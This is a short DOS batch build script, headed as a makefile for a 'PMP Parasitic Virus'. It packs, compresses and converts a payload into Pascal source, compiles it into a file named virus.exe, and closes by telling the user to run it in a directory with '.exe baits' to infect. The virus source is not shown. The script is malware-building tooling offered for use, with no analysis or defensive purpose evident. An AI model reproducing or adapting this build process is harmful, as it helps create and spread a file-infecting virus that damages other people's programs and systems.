: Makefile for PMP Parasitic Virus
del sfx.pmp
..\utils\sfxer *.p*
pklite dest.com
..\utils\bin2pas dest.com sfx.pmp
bpc pmpp
ren pmpp.exe virus.exe
del dest.com
Echo Virus.Exe created....Run it in any directory with .exe baits